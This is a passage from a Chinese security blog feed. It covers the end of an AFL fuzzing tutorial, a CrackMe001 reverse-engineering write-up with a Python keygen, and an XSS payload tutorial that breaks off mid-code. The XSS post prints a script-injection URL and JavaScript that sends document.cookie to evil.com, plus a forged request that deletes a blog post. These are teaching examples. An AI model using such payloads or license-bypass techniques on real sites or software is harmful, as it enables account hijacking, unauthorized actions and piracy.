crash</code>: 表示自从最后一个独特崩溃被发现以来经过的时间。</p></li><li><p><code>last uniq hang</code>: 表示自从最后一个独特挂起被发现以来经过的时间。</p></li></ul></li><li><p><strong>overall results</strong>：</p><ul><li><p><code>cycles done</code> : 表示 AFL 完成的模糊测试循环次数。每个循环包括一系列的变异测试用例。</p><blockquote><p>如果这个字段变绿就说明后面即使继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</p></blockquote></li><li><p><code>total paths</code> : 表示 AFL 发现的总路径数量。每个路径代表程序执行中的一个独特分支或状态。</p></li><li><p><code>unique crashes</code> : 表示 AFL 发现的独特崩溃数量。这些崩溃可能是潜在漏洞的指示。</p></li><li><p><code>unique hangs</code> : 表示 AFL 发现的独特挂起数量。挂起可能是由于程序陷入无限循环或其他无响应状态造成的。</p></li></ul></li></ol><ul><li><code>cycles done</code>：</li><li><code>uniq crashes</code>：代表的是crash的数量</li></ul><ol start="3"><li><p>cycle progress</p></li><li><p>map coverage</p></li><li><p>stage progress</p><p>包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。 执行速度可以直观地反映当前跑的快不快，如果速度过慢，我们可能需要进一步优化我们的Fuzzing。 </p></li><li><p>findings in depth</p></li><li><p>fuzzing strategy yields</p></li><li><p>path geometry</p></li></ol><h4 id="fuzz-out分析"><a href="#fuzz-out分析" class="headerlink" title="fuzz_out分析"></a>fuzz_out分析</h4><p>使用 <code>tree</code> 命令查看out文件夹的目录结构</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326162321739.png" alt="image-20240326162321739"></p><p>目录中文件的作用：</p><ul><li>**queue&#x2F;**：存放所有具有独特执行路径的测试用例</li><li>**crashes&#x2F;**： 存放能触发待测程序崩溃的测试样本</li><li><strong>hangs&#x2F;</strong> ：存发导致待测程序超时的测试样本</li><li><strong>fuzzer_stats</strong> - 文本文件，包含了fuzzer的实时统计信息，如执行速度、路径覆盖等度量指标。这个文件不断更新以反映当前的fuzzing状态。</li><li><strong>plot_data</strong> - 文本文件，包含了AFL执行过程中的统计数据。使用AFL的<code>afl-plot</code>工具处理<code>plot_data</code>文件，可以生成fuzz过程的可视化图像。</li><li><strong>fuzz_bitmap</strong> - 这是用来记录路径覆盖率的位图（coverage bitmap），非人类可读。AFL使用这个位图来跟踪程序在处理不同输入时执行的不同分支，用来帮助AFL识别新的、唯一的代码路径，以便后续生成更具有探索性的测试样本。</li></ul><p>查看 <code>fuzz_out/crashes</code> 文件夹，下面的十六进制文件即为产生崩溃的结果，</p><p>可以通过 <code>xxd</code> 命令查看对应测试用例的内容</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326161001683.png" alt="image-20240326161001683"></p><p>可以看到产生crash的用例都符合栈溢出漏洞的情况</p><h2 id="qemu模式——无源码黑盒测试"><a href="#qemu模式——无源码黑盒测试" class="headerlink" title="qemu模式——无源码黑盒测试"></a>qemu模式——无源码黑盒测试</h2><p>qemu模式为在没有源代码的情况下，直接对二进制程序进行fuzzing。注意此类方法准确度较低。</p><h3 id="下载安装qemu"><a href="#下载安装qemu" class="headerlink" title="下载安装qemu"></a>下载安装qemu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu_mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>当出现各种库的缺失报错，参考：<a src="https://blog.csdn.net/song_lee/article/details/105082092">深入分析 afl &#x2F; qemu-mode(qemu模式) &#x2F; afl-unicorn 编译及安装存在的问题以及相应的解决方案</a></p><p>然后修改 <code>build_qemu_support.sh</code> 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu-project.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>删除掉红框部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201217863.png" alt="image-20240326201217863"></p><p>找到下面这部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201323845.png" alt="image-20240326201323845"></p><p>删除后三行，更换为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patch -p1 &lt;../patches/syscall2.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/memfd_create.diff || exit 1</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/syscall2.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-clean/linux-user/syscall.c2020-03-12 18:47:47.898592169 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/linux-user/syscall.c2020-03-12 19:16:41.563074307 +0100</span></span><br><span class="line"><span class="meta">@@ -34,6 +34,7 @@</span></span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988</span></span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line"><span class="meta">@@ -116,6 +117,8 @@</span> int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern unsigned int afl_forksrv_pid;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -256,7 +259,9 @@</span> static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line"><span class="deletion">-_syscall0(int, gettid)</span></span><br><span class="line"><span class="addition">+// taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+#define __NR_sys_gettid __NR_gettid</span></span><br><span class="line"><span class="addition">+_syscall0(int, sys_gettid)</span></span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line"><span class="meta">@@ -6219,7 +6224,8 @@</span> static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line"><span class="deletion">-    info-&gt;tid = gettid();</span></span><br><span class="line"><span class="addition">+    // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+    info-&gt;tid = sys_gettid();</span></span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line"><span class="meta">@@ -6363,9 +6369,11 @@</span> static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), child_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), child_tidptr);</span></span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), parent_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), parent_tidptr);</span></span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line"><span class="meta">@@ -11402,7 +11410,8 @@</span> abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line"><span class="deletion">-        ret = get_errno(gettid());</span></span><br><span class="line"><span class="addition">+        // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+        ret = get_errno(sys_gettid());</span></span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/memfd_create.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c</span><br><span class="line"><span class="comment">--- qemu-2.10.0-clean/util/memfd.c      2018-11-20 18:11:00.170271506 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/util/memfd.c    2018-11-20 18:11:13.398423613 +0100</span></span><br><span class="line"><span class="meta">@@ -37,7 +37,7 @@</span></span><br><span class="line"> #include &lt;sys/syscall.h&gt;</span><br><span class="line"> #include &lt;asm/unistd.h&gt;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-static int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"><span class="addition">+int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"> &#123;</span><br><span class="line"> #ifdef __NR_memfd_create</span><br><span class="line">     return syscall(__NR_memfd_create, name, flags);</span><br></pre></td></tr></table></figure><p>再运行 <code>./build_qemu_support.sh</code> ，终于成功了</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201812776.png" alt="image-20240326201812776"></p><h3 id="使用qemu模式fuzz"><a href="#使用qemu模式fuzz" class="headerlink" title="使用qemu模式fuzz"></a>使用qemu模式fuzz</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz-in -o fuzz-out -Q ./mips-test</span><br></pre></td></tr></table></figure><p>和有源码fuzz的区别就是加上了一个参数 <code>-Q</code> </p><p>如果为文件输入记得在末尾加上 <code>@@</code></p><h1 id="报错问题"><a href="#报错问题" class="headerlink" title="报错问题"></a>报错问题</h1><p>在执行 <code>./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</code> 命令的时候，产生了如下报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326203348393.png" alt="image-20240326203348393"></p><p>按照报错信息，输入 <code>echo core &gt;/proc/sys/kernel/core_pattern</code>，提示权限不够的话可以输入以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><blockquote><p>这里是因为重定向操作符 <code>&gt;</code> 在执行前就已经获得了 sudo 权限，但是 <code>echo</code> 命令本身并没有获得 sudo 权限。</p><p>解决方法是使用 <code>tee</code> 命令，因为 <code>tee</code> 命令可以将输入内容写入文件，而且可以使用 sudo 权限执行。</p></blockquote><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326094802123.png" alt="image-20240326094802123"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a src="https://zhuanlan.zhihu.com/p/90037601">从AFL开始FUZZ之旅</a></li><li><a src="https://www.freebuf.com/articles/system/191536.html">AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing</a></li><li><a src="https://blog.csdn.net/zhongzhehua/article/details/117717656">利用AFL进行模糊测试</a></li><li><a src="https://zhuanlan.zhihu.com/p/680730032">模糊测试工具 AFL的原理与实践</a></li><li><a src="https://blog.csdn.net/weixin_51214674/article/details/134646388?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171145366716800182756803%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=171145366716800182756803&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~timeliness~default-3-134646388-null-null.142^v100^pc_search_result_base2&utm_term=afl%20qemu%E5%AE%89%E8%A3%85">模糊测试FUZZ——AFL安装使用</a></li><li><a src="https://paper.seebug.org/842/">AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『逆向』CrackMe001 逆向分析</title>
      <link href="/posts/fadc.html"/>
      <url>/posts/fadc.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><p><strong>160个CrackMe的打包文件下载地址：</strong><a href="https://www.lanzoub.com/ipwFHha3bbc">https://www.lanzoub.com/ipwFHha3bbcc</a> 密码:52pj</p><p>win10虚拟机：<a src="https://blog.csdn.net/lvlheike/article/details/120398259">VMware中安装win10教程</a></p><p>IDA pro7.2：<a src="https://blog.csdn.net/Henryli1202/article/details/135072651">逆向分析学习小纪——IDA Pro工具的安装与基本使用</a></p><p>ollydby1.0 ：<a src="https://blog.csdn.net/fittec/article/details/126825758">OllyDbg下载与安装</a></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>选择CrackMe–001的 <code>Acid burn.exe</code> 进行逆向分析</p><p>首先运行程序，看看程序的功能</p><p>可以看到程序提供了两种登陆方法，分别是：通过序列号和用户名验证，和单独通过序列号验证</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171549838.png" alt="image-20240401171549838"></p><p>选择serial登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112538216.png" alt="image-20240402112538216"></p><p>serial+name登陆方式也一样。</p><p>破解的思路如下：</p><p>因为程序后台肯定是由一个正确的序列号的（不管是代码写死的，还是动态生成的，反正在点击验证按钮的时候，这个序列号肯定是生成好的）。这里出现了对话框，说明作者在校验注册码之后发现如果错误了就直接弹窗，所以只要找到弹出对话框的代码处，向上跟踪，就可以找出判断是否正确的地方了，从而进一步破解程序。</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，而且是用Delphi语言编写的。所以并不需要进行脱壳</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401113359966.png" alt="image-20240401113359966"></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>接下来对程序进行爆破，修改代码使得输入任何子串都提示正确或成功；</p><p>首先将程序放到OD中，Debug –&gt; Run运行程序</p><p>选择serial+name登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171710770.png" alt="image-20240401171710770"></p><p>保持 Try Again 的窗口不要关，然后切换到 OD 界面，按F12暂停程序，进入调试状态。</p><p>点击 Window –&gt; 7 call stack of main thread ，或者直接点击工具栏中的 K 按钮，查看线程堆栈，额可以看到我们选中的这行应该就是弹窗对应的 <code>MessageBoxA函数</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173244715.png" alt="image-20240401173244715"></p><p>选中这一行，右键选择show call跳转到对应的汇编代码出</p><p>跳转到的选中行就是反汇编之后，程序中控制弹出提示框的语句。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173704942.png" alt="image-20240401173704942"></p><p>所以，序列号验证的逻辑肯定就在这句前面不远处。</p><p>往上翻，我们找到了 push ebp 这句代码，这句代码在汇编语言中，一般在程序入口会出现，在 <code>42A193</code> 这里 F2 打个断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401191338213.png" alt="image-20240401191338213"></p><p>重新运行程序（直接点击运行按钮或鼠标选中后按F9）</p><p>重新点击 <code>Check it baby</code> 按钮，在右下角堆栈处找到定位语句最近的一条<code>Return </code> 语句：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202513876.png" alt="image-20240401202513876"></p><p>右键 <code>Follow in Disassm..(反汇编跟随)</code>，这里直接连接了一个跳转，往下面翻，可以看到有这一段<code>JNZ</code>和<code>JMP</code>比较后跳转的两部分代码 Jnz 则进入Good job Dude, 否则就进入JMP Sorry</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202933245.png" alt="image-20240401202933245"></p><p>选中JNZ语句，右键选择 <code>Fill with NOPs</code>，通过nops(空指令填充)替换<code>JNZ</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401203349476.png" alt="image-20240401203349476"></p><p>重新执行程序，仍然是输入 <code>aa</code> ，发现出现了验证失败弹窗，往前翻，发现在执行选择之前有一个审查，如果serial小于4直接验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000609854.png" alt="image-20240402000609854"></p><p>所以我们再重新执行，输入 <code>aaaa</code>，可以看到成功绕过</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401212619104.png" alt="image-20240401212619104"></p><h2 id="分析序号生成算法"><a href="#分析序号生成算法" class="headerlink" title="分析序号生成算法"></a>分析序号生成算法</h2><p>从这里的反汇编部分代码，可以看到用户名的计算算法流程， 首先取出用户名的第一位，乘以0x29。然后再乘以2。保留结果。假设结果为16BE，也就是十 进制的5822</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000725167.png" alt="image-20240402000725167"></p><p>接着，将计算的结果转为字符串，然后和实现准备好的字符串进行拼接，结果为—— CW-5822-CRACKED 这个就是序 列号，也就是说序列号是根据用户名动态生成的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402001450319.png" alt="image-20240402001450319"></p><h2 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 密码</span></span><br><span class="line">    key1 = <span class="string">&quot;CW&quot;</span></span><br><span class="line">    key2 = <span class="string">&quot;CRACKED&quot;</span></span><br><span class="line">    <span class="comment"># 输入用户名</span></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名 长度必须大于等于4: &quot;</span>)</span><br><span class="line">    <span class="comment"># 判断长度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;长度必须大于等于4,请重新输入\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 根据用户名生成密码</span></span><br><span class="line">    <span class="comment"># 计算用户名的第一位</span></span><br><span class="line">    username1 = <span class="built_in">ord</span>(username[<span class="number">0</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x3</span>) - username1  <span class="comment"># 左移0x3位再减去原来的值</span></span><br><span class="line">    <span class="comment"># 计算用户名第二位</span></span><br><span class="line">    username2 = <span class="built_in">ord</span>(username[<span class="number">1</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x4</span>) + result1  <span class="comment"># 左移4位再加上原来的结果</span></span><br><span class="line">    <span class="comment"># 计算用户名的第四位</span></span><br><span class="line">    username4 = <span class="built_in">ord</span>(username[<span class="number">3</span>])</span><br><span class="line">    result2 = username4 * <span class="number">0xB</span>  <span class="comment"># 乘以0xB</span></span><br><span class="line">    <span class="comment"># 计算用户名的第三位</span></span><br><span class="line">    username3 = <span class="built_in">ord</span>(username[<span class="number">2</span>])</span><br><span class="line">    result2 = (username3 * <span class="number">0xE</span>) + result2  <span class="comment"># 乘以0xE再加上第四位的结果</span></span><br><span class="line">    <span class="comment"># 再次计算第一位</span></span><br><span class="line">    result3 = username1 * <span class="number">0x29</span> * <span class="number">2</span>  <span class="comment"># 乘以0x29再乘以2</span></span><br><span class="line">    <span class="comment"># 将result3转为ASCII 并拼接密钥</span></span><br><span class="line">    key = <span class="string">f&quot;<span class="subst">&#123;key1&#125;</span>-<span class="subst">&#123;result3&#125;</span>-<span class="subst">&#123;key2&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># 打印key</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;密钥为:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行程序，随便输入一个用户名</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112453492.png" alt="image-20240402112453492"></p><p>程序根据输入的用户名算出了一组序列号，输入到目标程序里，成功进入</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112440883.png" alt="image-20240402112440883"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a src="https://blog.csdn.net/wenxuhonghe/article/details/95638925">CrackMe 实战】逆向破解实战之 001 Acid burn.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS攻击进阶——XSS payload</title>
      <link href="/posts/a4a5.html"/>
      <url>/posts/a4a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-XSS-payload"><a href="#什么是-XSS-payload" class="headerlink" title="什么是 XSS payload"></a>什么是 XSS payload</h1><p>当发现网站存在XSS漏洞时，攻击者能够对该网站植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些<strong>用以完成各种具体功能的恶意脚本</strong>，被称为XSS Payload。</p><blockquote><p>XSS Payload实际上就是JavaScript脚本（还可以是 Flash或其他富客户端的脚本)，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到</p></blockquote><h1 id="最常见的XSS-payload——Cookie劫持"><a href="#最常见的XSS-payload——Cookie劫持" class="headerlink" title="最常见的XSS payload——Cookie劫持"></a>最常见的XSS payload——Cookie劫持</h1><ol><li><p><strong>概念</strong></p><p>最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。</p><blockquote><p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。</p></blockquote></li><li><p><strong>例子</strong></p><p>如下所示，攻击者可以先构造一个含恶意参数的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>加载一个远程脚本，真正的XSS Payload写在远程脚本 <code>evil.js</code> 中。</p><blockquote><p>这样可以避免直接在URL的参数里写入大量的JavaScript代码。</p></blockquote><p>在 <code>evil.js</code>  中，可以通过如下代码窃取Cookie:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img -<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://www.evil.com/log?&quot;</span> + <span class="built_in">escape</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>当用户访问这个构造的url时执行脚本，这段代码在页面中插入了一张看不见的图片，同时把 docnment cookie对象作为参数发送到远程服务器。</p><p>这样就实现了cookie 的劫持</p></li></ol><p>在成功实现XSS攻击后，除了cookie劫持之外，攻击者还有很多更强大的 XSS payload来控制用户的浏览器</p><h1 id="构造GET和POST请求"><a href="#构造GET和POST请求" class="headerlink" title="构造GET和POST请求"></a>构造GET和POST请求</h1><ol><li><p><strong>原理</strong></p><p>一个网站的应用，只需要接受HTTP协议中的GET 或 POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。</p></li><li><p><strong>构造GET请求例子</strong></p><p>假设某博客网站存在XSS漏洞，我们如何通过XSS漏洞来删除掉博客上的某篇文章？</p><p>假设正常删除该文章的链接是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</span><br></pre></td></tr></table></figure><p>攻击者可以构造一段javascript代码（XSS Payload）如下，</p><p>这段代码中，通过插入一个img标签来发起一个GET请求，从而对删除文章的链接发出了请求</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure><p>后续，攻击者只需要通过XSS漏洞诱使用户执行这段XSS Payload，就会删除这篇文章</p></li><li><p><strong>构造POST请求例子</strong></p><p>如果网站上只有一个表单，即仅接收POST请求，如何实施XSS攻击？</p><p>可以通过两种方法实现攻击：</p><ul><li><p><strong>1）构造一个form表单，自动提交这个表单</strong></p><ul><li><p>a. 一个个构造DOM节点</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td 